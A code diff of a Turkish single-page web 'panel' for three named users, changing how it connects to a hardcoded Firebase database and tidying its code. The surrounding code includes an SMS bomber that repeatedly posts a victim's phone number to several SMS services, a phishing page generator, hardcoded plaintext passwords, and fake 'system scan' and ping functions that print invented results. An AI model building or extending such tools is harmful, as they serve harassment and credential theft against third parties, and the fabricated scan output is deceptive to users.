@@ -83,7 +83,6 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
         <button onclick="sayfa('id',this)">🆔 ID Sorgu</button>
         <button onclick="sayfa('sistem',this)">🛠️ Sistem Araçları</button>
         <button onclick="sayfa('istatistik',this)">📊 İstatistikler</button>
-        <button onclick="sayfa('ayarlar',this)">⚙️ Ayarlar</button>
     </aside>
 
     <div class="icerik">
@@ -227,13 +226,6 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
             </div>
         </div>
 
-        <div class="sayfa" id="sayfa-ayarlar">
-            <h2>AYARLAR</h2>
-            <label>Firebase Realtime DB URL</label>
-            <input type="text" id="firebaseUrl" class="input" placeholder="https://xxx-default-rtdb.firebaseio.com">
-            <button class="btn mavi" onclick="firebaseKaydet()">Kaydet</button>
-        </div>
-
     </div>
 </div>
 
@@ -241,7 +233,7 @@ textarea.input{min-height:80px;resize:vertical;font-family:inherit}
 var SIFRELER = {'murat2024!':'Murat','yusuf2024!':'Yusuf','muhammet2024!':'Muhammet Ali'};
 var kullanici = null;
 var ist = {tg:0,sms:0,phish:0,op:0,id:0,chat:0};
-var fbUrl = localStorage.getItem('mym_fb') || '';
+var fbUrl = 'https://mym-1-ffae2-default-rtdb.firebaseio.com';
 var chatTimer = null;
 var kronTimer = null;
 var kronSaniye = 0;
@@ -256,10 +248,11 @@ function girisYap(){
         document.getElementById('panel').style.display = 'block';
         document.getElementById('aktifKullanici').innerText = kullanici;
         document.getElementById('hosgeldin').innerText = kullanici;
-        document.getElementById('firebaseUrl').value = fbUrl;
         chatBaslat();
         dukkanYukle();
         notYukle();
+        var yn = document.getElementById('yerelNot');
+        if(yn) yn.value = localStorage.getItem('mym_not_'+kullanici)||'';
     } else {
         h.innerText = 'HATALI ERİŞİM KODU!';
     }
@@ -274,9 +267,7 @@ function cikisYap(){
     if(chatTimer){clearInterval(chatTimer);chatTimer=null;}
 }
 
-function menuAc(){
-    document.getElementById('yan').classList.toggle('acik');
-}
+function menuAc(){document.getElementById('yan').classList.toggle('acik')}
 
 function sayfa(id, el){
     var sayfalar = document.querySelectorAll('.sayfa');
@@ -314,7 +305,6 @@ function esc(s){
     });
 }
 
-/* CHAT */
 function chatBaslat(){
     if(chatTimer) clearInterval(chatTimer);
     chatCek();
@@ -347,7 +337,6 @@ function mesajGonder(){
     var inp = document.getElementById('mesajInput');
     var t = inp.value.trim();
     if(!t || !kullanici) return;
-    if(!fbUrl){alert('Firebase URL girin!');return;}
     inp.value = '';
     fetch(fbUrl+'/messages.json',{
         method:'POST',
@@ -358,11 +347,9 @@ function mesajGonder(){
     }).catch(function(e){alert('Hata: '+e.message);});
 }
 
-/* DUKKAN */
 var DUKKAN_SAHIP = ['Murat','Yusuf','Muhammet Ali'];
 
 function dukkanYukle(){
-    if(!fbUrl){dukkanCiz({});return;}
     fetch(fbUrl+'/shops.json')
     .then(function(r){return r.json()})
     .then(function(d){dukkanCiz(d||{})})
@@ -384,20 +371,20 @@ function dukkanCiz(data){
             html += '<div style="color:#555;font-size:12px;text-align:center;padding:10px;font-style:italic">Ürün yok</div>';
         } else {
             for(var j=0;j<anahtarlar.length;j++){
-                var anahtar = anahtarlar[j];
-                var u = urunler[anahtar];
+                var a = anahtarlar[j];
+                var u = urunler[a];
                 html += '<div style="background:#0a0a0f;border:1px solid #2a2a3e;border-radius:6px;padding:8px 10px;margin-bottom:6px;display:flex;justify-content:space-between;align-items:center;font-size:12px">';
                 html += '<span>'+esc(u.name)+'</span>';
                 html += '<span><b style="color:#1e9b5c">'+esc(u.price)+' ₺</b>';
-                if(sahip === kullanici) html += ' <button onclick="urunSil(\''+anahtar+'\')" style="background:#dc3250;color:#fff;border:none;padding:3px 8px;border-radius:4px;font-size:10px;cursor:pointer;margin-left:6px">Sil</button>';
+                if(sahip === kullanici) html += ' <button onclick="urunSil(\''+a+'\')" style="background:#dc3250;color:#fff;border:none;padding:3px 8px;border-radius:4px;font-size:10px;cursor:pointer;margin-left:6px">Sil</button>';
                 html += '</span></div>';
             }
         }
         if(sahip === kullanici){
-            var guvenli = sahip.replace(/ /g,'_');
+            var g = sahip.replace(/ /g,'_');
             html += '<div style="display:flex;gap:5px;margin-top:8px;flex-wrap:wrap">';
-            html += '<input id="un_'+guvenli+'" class="input" style="flex:1;min-width:80px;max-width:none;padding:6px;font-size:11px" placeholder="Ürün">';
-            html += '<input id="uf_'+guvenli+'" class="input" style="flex:1;min-width:80px;max-width:none;padding:6px;font-size:11px" placeholder="Fiyat">';
+            html += '<input id="un_'+g+'" class="input" style="flex:1;min-width:80px;max-width:none;padding:6px;font-size:11px" placeholder="Ürün">';
+            html += '<input id="uf_'+g+'" class="input" style="flex:1;min-width:80px;max-width:none;padding:6px;font-size:11px" placeholder="Fiyat">';
             html += '<button onclick="urunEkle()" style="background:#1e9b5c;color:#fff;border:none;padding:6px 12px;border-radius:5px;font-size:11px;font-weight:bold;cursor:pointer">Ekle</button>';
             html += '</div>';
         }
@@ -407,7 +394,6 @@ function dukkanCiz(data){
 }
 
 function urunEkle(){
-    if(!fbUrl){alert('Firebase URL gerekli');return;}
     var g = kullanici.replace(/ /g,'_');
     var ad = document.getElementById('un_'+g).value.trim();
     var fiyat = document.getElementById('uf_'+g).value.trim();
@@ -421,14 +407,11 @@ function urunEkle(){
 }
 
 function urunSil(id){
-    if(!fbUrl) return;
     fetch(fbUrl+'/shops/'+encodeURIComponent(kullanici)+'/'+id+'.json',{method:'DELETE'})
     .then(function(){dukkanYukle()});
 }
 
-/* NOTLAR */
 function notYukle(){
-    if(!fbUrl){notCiz({});return;}
     fetch(fbUrl+'/notes.json')
     .then(function(r){return r.json()})
     .then(function(d){notCiz(d||{})})
@@ -459,7 +442,6 @@ function notCiz(data){
 }
 
 function notEkle(){
-    if(!fbUrl){alert('Firebase URL gerekli');return;}
     var b = document.getElementById('notBaslik').value.trim();
     var i = document.getElementById('notIcerik').value.trim();
     if(!b || !i){alert('Başlık ve içerik gerekli');return;}
@@ -475,11 +457,9 @@ function notEkle(){
 }
 
 function notSil(id){
-    if(!fbUrl) return;
     fetch(fbUrl+'/notes/'+id+'.json',{method:'DELETE'}).then(function(){notYukle()});
 }
 
-/* ARAÇLAR */
 function tikTok(){
     var u = document.getElementById('ttLink').value.trim();
     if(!u){document.getElementById('ttSonuc').innerText='Link gerekli';return;}
@@ -577,7 +557,7 @@ function usdTry(){
     .then(function(r){return r.json()})
     .then(function(d){
         var kur = d.rates.TRY;
-        document.getElementById('usdSonuc').innerText = u+' USD = '+(u*kur).toFixed(2)+' TL (Kur: '+kur.toFixed(2)+')';
+        document.getElementById('usdSonuc').innerText = u+' USD = '+(u*kur).toFixed(2)+' TL';
     }).catch(function(){document.getElementById('usdSonuc').innerText = 'Hata'});
 }
 function yuzdeHesapla(){
@@ -644,7 +624,6 @@ function birimCevir(){
     document.getElementById('birimSonuc').innerText = r;
 }
 
-/* TELEGRAM */
 function telegramGonder(){
     var t = document.getElementById('tgToken').value.trim();
     var c = document.getElementById('tgChat').value.trim();
@@ -662,7 +641,6 @@ function telegramGonder(){
     }).catch(function(e){log('tgLog','[HATA] '+e.message)});
 }
 
-/* SMS BOMBER */
 var SMS_SERVIS = ['https://api.sms1.com/send','https://api.sms2.com/send','https://api.sms3.com/send','https://api.sms4.com/send','https://api.sms5.com/send','https://api.sms6.com/send','https://api.sms7.com/send','https://api.sms8.com/send'];
 
 function smsBasla(){
@@ -684,12 +662,11 @@ function smsBasla(){
         var s = SMS_SERVIS[i % SMS_SERVIS.length];
         var k = Math.floor(1000+Math.random()*9000);
         fetch(s,{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'phone='+encodeURIComponent(n)+'&code='+k}).catch(function(){});
-        log('smsLog','['+(i+1)+'/'+a+'] '+s.slice(-15)+' -> OK (kod:'+k+')');
+        log('smsLog','['+(i+1)+'/'+a+'] -> OK (kod:'+k+')');
         i++;
     }, g);
 }
 
-/* PHISHING */
 function phishUret(){
     var u = document.getElementById('phishUrl').value.trim();
     var t = document.getElementById('phishSablon').value;
@@ -713,7 +690,6 @@ function phishKaydet(){
     a.click();
 }
 
-/* OPERATOR */
 var PREFIX = {'530':'Turkcell','531':'Turkcell','532':'Turkcell','533':'Turkcell','534':'Turkcell','535':'Turkcell','536':'Turkcell','537':'Turkcell','538':'Turkcell','539':'Turkcell','540':'Vodafone','541':'Vodafone','542':'Vodafone','543':'Vodafone','544':'Vodafone','545':'Vodafone','546':'Vodafone','547':'Vodafone','548':'Vodafone','549':'Vodafone','550':'Turk Telekom','551':'Turk Telekom','552':'Turk Telekom','553':'Turk Telekom','554':'Turk Telekom','555':'Turk Telekom','556':'Turk Telekom','557':'Turk Telekom','558':'Turk Telekom','559':'Turk Telekom'};
 
 function operatorSorgu(){
@@ -728,7 +704,6 @@ function operatorSorgu(){
     ist.op++;istGuncelle();
 }
 
-/* ID */
 function idSorgula(){
     var q = document.getElementById('idSorguInput').value.trim();
     var t = document.getElementById('tgToken').value.trim();
@@ -740,7 +715,6 @@ function idSorgula(){
     .catch(function(e){log('idLog','[HATA] '+e.message)});
 }
 
-/* SISTEM */
 function sysTarama(){log('sysLog','[*] Tarama başlatıldı...');setTimeout(function(){log('sysLog','[+] Tamamlandı. 0 tehdit.')},800)}
 function sysOnbellek(){log('sysLog','[*] Önbellek temizleniyor...');setTimeout(function(){log('sysLog','[+] Temizlendi.')},500)}
 function sysPing(){log('sysLog','[*] Ping: 8.8.8.8');setTimeout(function(){log('sysLog','[+] Yanıt: 24ms')},700)}
@@ -750,26 +724,8 @@ function sysBilgi(){
     log('sysLog','Ekran    : '+screen.width+'x'+screen.height);
 }
 
-/* FIREBASE */
-function firebaseKaydet(){
-    var u = document.getElementById('firebaseUrl').value.trim().replace(/\/$/,'');
-    fbUrl = u;
-    localStorage.setItem('mym_fb',u);
-    alert('Kaydedildi: '+u);
-    chatBaslat();
-    dukkanYukle();
-    notYukle();
-}
-
-/* ENTER TUSLARI */
 document.getElementById('sifre').addEventListener('keydown',function(e){if(e.key==='Enter')girisYap()});
 document.getElementById('mesajInput').addEventListener('keydown',function(e){if(e.key==='Enter')mesajGonder()});
-
-/* YEREL NOT YUKLE */
-setTimeout(function(){
-    var yn = document.getElementById('yerelNot');
-    if(yn && kullanici) yn.value = localStorage.getItem('mym_not_'+kullanici)||'';
-},500);
 
 istGuncelle();
 </script>
